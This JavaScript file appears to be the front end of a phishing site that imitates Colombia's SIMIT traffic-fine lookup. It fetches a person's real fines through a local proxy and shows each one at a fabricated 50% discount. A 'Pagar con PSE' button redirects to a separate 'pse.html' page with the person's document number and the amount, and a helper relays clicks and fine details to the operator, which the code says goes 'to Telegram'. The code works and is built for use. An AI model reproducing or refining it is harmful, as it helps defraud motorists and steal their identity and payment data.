document.addEventListener('DOMContentLoaded', () => {
    const searchBtn = document.getElementById('searchBtn');
    const searchInput = document.getElementById('searchInput');
    const resultContainer = document.getElementById('resultContainer');
    const loading = document.getElementById('loading');

    // Helper to log actions to Telegram
    async function logAction(action, details) {
        try {
            await fetch('http://127.0.0.1:3004/api/log-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action, details })
            });
        } catch (e) {
            console.error('Error logging action:', e);
        }
    }

    // Event listener for dynamic elements (Pay Button)
    resultContainer.addEventListener('click', (e) => {
        // Handle click on button or its children (img/span)
        const btn = e.target.closest('.btn-pagar');
        if (btn) {
            const resolucion = btn.getAttribute('data-resolucion');
            const valor = btn.getAttribute('data-valor');
            const docType = btn.getAttribute('data-doc-type') || 'CC'; // Default to CC if missing
            const docNum = btn.getAttribute('data-doc-num') || '';

            // Safe logging (check if logAction exists)
            if (typeof logAction === 'function') {
                 logAction('💰 Clic en Pagar PSE', `Resolución: ${resolucion} - Valor: $${parseInt(valor).toLocaleString()}`);
            }
            
            // Redirect to PSE "loading" page with all parameters
            window.location.href = `pse.html?ref=${resolucion}&val=${valor}&dt=${docType}&dn=${docNum}`;
        }
    });

    searchBtn.addEventListener('click', performSearch);
    searchInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') performSearch();
    });

    async function performSearch() {
        const query = searchInput.value.trim();
        if (!query) return;

        console.log('Consultando (v2):', query);

        // Reset UI completely
        resultContainer.style.display = 'none';
        resultContainer.innerHTML = ''; // Clear previous results/errors
        loading.style.display = 'block';
        searchBtn.disabled = true;

        try {
            // Call our local proxy server
            const response = await fetch('http://127.0.0.1:3004/api/consultar', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ query: query })
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status} ${response.statusText}`);
            }

            const data = await response.json();
            console.log('API Response:', data); // Debugging
            
            loading.style.display = 'none';
            resultContainer.style.display = 'block';
            searchBtn.disabled = false;

            if (data.error || data.success === false) {
                let userFriendlyError = data.error || 'Error desconocido';
                const details = data.details || '';
                
                // Prioritize Captcha warning
                if (details.includes('Captcha') || userFriendlyError.includes('Captcha')) {
                    userFriendlyError = `
                        <div style="text-align: center;">
                            <i class="fas fa-robot" style="font-size: 40px; color: #ff9800; margin-bottom: 10px;"></i><br>
                            <strong>Verificación de Seguridad Requerida</strong><br>
                            El sistema SIMIT ha detectado tráfico inusual y solicita un Captcha.<br>
                            Intenta nuevamente en unos minutos.
                        </div>`;
                } else if (details.includes('timeout') || userFriendlyError.includes('timeout')) {
                    userFriendlyError = '⏳ El sistema SIMIT está tardando demasiado en responder. Es posible que la plataforma esté congestionada.';
                }

                const detailMsg = (details && !userFriendlyError.includes('div')) ? `<br><small style="color:#666; font-size: 0.8em">${details}</small>` : '';
                
                // If it's HTML (our custom captcha msg), don't escape it. If text, wrap it.
                if (userFriendlyError.includes('<div')) {
                    resultContainer.innerHTML = `<div class="error-msg" style="background-color: #fff3e0; border-color: #ffe0b2; color: #e65100;">${userFriendlyError}</div>`;
                } else {
                    resultContainer.innerHTML = `<div class="error-msg">${userFriendlyError}${detailMsg}</div>`;
                }
                return;
            }

            // Render Results
            const simitData = data.data;

            // Check if we have a list of fines (multas)
            if (simitData && Array.isArray(simitData.multas) && simitData.multas.length > 0) {
                // FIXED: Use searchInput for document number since we don't have separate inputs yet
                const docNum = document.getElementById('searchInput').value; 
                const docType = 'CC'; // Default value until we add a selector


                // Create HTML for results
                let html = '<h3 style="color: #003366; margin-top: 20px;">Estado de cuenta</h3>';
                
                simitData.multas.forEach(multa => {
                    const valorOriginal = parseInt(multa.valorPagar || multa.valor || 0);
                    const valorDescuento = Math.floor(valorOriginal / 2);

                    html += `
                        <div class="result-card">
                            <div class="card-header">
                                <strong>Resolución Nro. ${multa.numeroResolucion || 'N/A'}</strong>
                                <span class="badge">Pendiente de pago</span>
                            </div>
                            <div class="card-body">
                                <div class="info-row">
                                    <span>Fecha:</span>
                                    <strong>${multa.fechaComparendo || 'N/A'}</strong>
                                </div>
                                <div class="info-row">
                                    <span>Infracción:</span>
                                    <strong>${multa.infraccion || 'N/A'}</strong>
                                </div>
                                <div class="info-row">
                                    <span>Valor a pagar (50% Dto):</span>
                                    <strong>$${valorDescuento.toLocaleString()}</strong>
                                </div>
                                <div class="info-row">
                                    <span>Secretaría:</span>
                                    <strong>${multa.secretaria || 'N/A'}</strong>
                                </div>
                            </div>
                            <button class="btn-pagar" 
                                data-resolucion="${multa.numeroResolucion || 'N/A'}" 
                                data-valor="${valorDescuento}"
                                data-doc-type="${docType}"
                                data-doc-num="${docNum}">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/13/Logo_PSE.svg/1200px-Logo_PSE.svg.png" alt="PSE" style="height: 20px; vertical-align: middle; margin-right: 8px;">
                                Pagar con PSE
                            </button>
                        </div>
                    `;
                });
                resultContainer.innerHTML = html;
            } 
            // Check for empty results
            else if (simitData && Array.isArray(simitData.multas) && simitData.multas.length === 0) {
                 resultContainer.innerHTML = '<div class="success-msg">✅ No se encontraron multas o comparendos pendientes en el SIMIT.</div>';
            }
            // Fallback: Dump JSON if structure is unknown
            else {
                resultContainer.innerHTML = `
                    <div class="info-msg">
                        <h3>Respuesta del SIMIT:</h3>
                        <pre>${JSON.stringify(simitData, null, 2)}</pre>
                    </div>
                `;
            }

        } catch (error) {
            console.error('Error en la consulta:', error);
            loading.style.display = 'none';
            searchBtn.disabled = false;
            resultContainer.style.display = 'block';
            
            let errorTitle = '❌ Error Inesperado';
            let errorMsg = 'Ocurrió un error al procesar la solicitud.';
            let solutionMsg = '';

            // Distinguish network errors from code errors
            if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError') || error.message.includes('conectar')) {
                errorTitle = '❌ Error de Conexión';
                errorMsg = 'No se pudo conectar con el servidor local.';
                solutionMsg = `
                    <br><strong>Solución:</strong><br>
                    1. Asegúrate de que el archivo <code>server.js</code> se esté ejecutando.<br>
                    2. Intenta acceder a <a href="http://localhost:3004" target="_blank">http://localhost:3004</a> directamente.
                `;
            } else {
                errorMsg = `Detalles del error: ${error.message}`;
            }

            // Show detailed error
            resultContainer.innerHTML = `
                <div class="error-msg" style="border-left: 4px solid #f44336;">
                    <strong>${errorTitle}</strong><br>
                    ${errorMsg}
                    ${solutionMsg}
                </div>
            `;
        }
    }
});
